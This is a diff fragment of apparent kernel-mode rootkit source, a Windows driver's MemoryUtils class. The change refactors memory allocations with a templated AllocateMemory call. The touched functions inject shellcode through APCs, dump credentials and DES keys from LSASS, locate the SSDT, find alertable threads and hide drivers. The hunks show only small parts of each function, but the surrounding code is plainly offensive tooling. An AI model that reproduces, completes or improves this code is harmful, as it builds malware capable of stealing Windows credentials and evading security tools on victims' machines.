@@ -257,8 +257,8 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bo
 			break;
 
 		// Create and execute the APCs.
-		ShellcodeApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);
-		PrepareApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);
+		ShellcodeApc = AllocateMemory<PKAPC>(sizeof(KAPC), false);
+		PrepareApc = AllocateMemory<PKAPC>(sizeof(KAPC), false);
 
 		if (!ShellcodeApc || !PrepareApc) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -724,7 +724,7 @@ NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
 		}
 
 		this->lastLsassInfo.DesKey.Size = desKey->hKey->key->hardkey.cbSecret;
-		this->lastLsassInfo.DesKey.Data = AllocateMemory(this->lastLsassInfo.DesKey.Size);
+		this->lastLsassInfo.DesKey.Data = AllocateMemory<PVOID>(this->lastLsassInfo.DesKey.Size);
 
 		if (!lastLsassInfo.DesKey.Data) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -768,7 +768,7 @@ NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
-		this->lastLsassInfo.Creds = (Credentials*)AllocateMemory(credentialsCount * sizeof(Credentials));
+		this->lastLsassInfo.Creds = AllocateMemory<Credentials*>(credentialsCount * sizeof(Credentials));
 
 		if (!this->lastLsassInfo.Creds) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -1401,7 +1401,7 @@ NTSTATUS MemoryUtils::GetSSDTAddress() {
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
 		if (info)
 			ExFreePoolWithTag(info, DRIVER_TAG);
-		info = (PRTL_PROCESS_MODULES)AllocateMemory(infoSize);
+		info = AllocateMemory<PRTL_PROCESS_MODULES>(infoSize);
 
 		if (!info) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -1485,7 +1485,7 @@ NTSTATUS MemoryUtils::FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
 		if (originalInfo)
 			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
-		originalInfo = (PSYSTEM_PROCESS_INFO)AllocateMemory(infoSize);
+		originalInfo = AllocateMemory<PSYSTEM_PROCESS_INFO>(infoSize);
 
 		if (!originalInfo) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -1584,18 +1584,11 @@ bool MemoryUtils::AddHiddenDriver(HiddenDriverItem item) {
 	for (ULONG i = 0; i < MAX_HIDDEN_DRIVERS; i++)
 		if (this->hiddenDrivers.Items[i].DriverName == nullptr) {
 			SIZE_T bufferSize = (wcslen(item.DriverName) + 1) * sizeof(WCHAR);
-			WCHAR* buffer = (WCHAR*)AllocateMemory(bufferSize);
+			WCHAR* buffer = AllocateMemory<WCHAR*>(bufferSize);
 
 			if (!buffer)
 				return false;
-
 			memset(buffer, 0, bufferSize);
-			/*errno_t err = wcscpy_s(buffer, wcslen(item.DriverName), item.DriverName);
-
-			if (err != 0) {
-				ExFreePoolWithTag(buffer, DRIVER_TAG);
-				return false;
-			}*/
 
 			__try {
 				RtlCopyMemory(buffer, item.DriverName, bufferSize);
